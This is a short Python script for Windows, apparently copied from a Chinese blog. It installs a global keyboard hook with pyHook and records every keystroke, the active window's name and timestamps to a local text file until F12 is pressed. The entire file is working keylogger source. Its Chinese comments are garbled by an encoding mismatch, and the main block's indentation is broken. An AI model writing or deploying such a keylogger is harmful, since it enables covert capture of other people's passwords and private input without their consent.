# -*- coding: cp936 -*-
import pythoncom  
import pyHook  
import time
import win32api
t=''
asciistr=''
keystr=''
def onKeyboardEvent(event):   
    global t,asciistr,keystr
    filename='d://test.txt'
    wrfile=open(filename,'ab')
    "��������¼�"
    if t==str(event.WindowName):
        asciistr=asciistr+chr(event.Ascii)
        keystr=keystr+str(event.Key)
        
    else:
        t=str(event.WindowName)
        if asciistr=='' and keystr=='':
            wrfile.writelines("\nWindow:%s\n" % str(event.Window))
            wrfile.writelines("WindowName:%s\n" % str(event.WindowName)) #д�뵱ǰ������
            wrfile.writelines("MessageName:%s\n" % str(event.MessageName))
            wrfile.writelines("Message:%d\n" % event.Message)
            wrfile.writelines("Time:%s\n" % time.strftime('%Y-%m-%d %H:%M:%S',time.localtime()))
        else:
            wrfile.writelines("Ascii_char:%s\n" %asciistr)
            wrfile.writelines("Key_char:%s\n" %keystr)
            wrfile.writelines("\nWindow:%s\n" % str(event.Window))
            wrfile.writelines("WindowName:%s\n" % str(event.WindowName)) #д�뵱ǰ������
            wrfile.writelines("Time:%s\n" % time.strftime('%Y-%m-%d %H:%M:%S',time.localtime()))
        
        asciistr=chr(event.Ascii)
        keystr=str(event.Key)
    if str(event.Key)=='F12':  #����F12����ֹ
        wrfile.writelines("Ascii_char:%s\n" %asciistr)
        wrfile.writelines("Key_char:%s\n" %keystr)
        wrfile.close()
        win32api.PostQuitMessage()
        
    return True
   
    

if __name__ == "__main__":
	pass
    '''
С���壺http://www.cnblogs.com/xiaowuyi
'''

#����hook���  
hm = pyHook.HookManager()  

#��ؼ���  
hm.KeyDown = onKeyboardEvent  
hm.HookKeyboard()  

#ѭ����ȡ��Ϣ  
pythoncom.PumpMessages(10000)  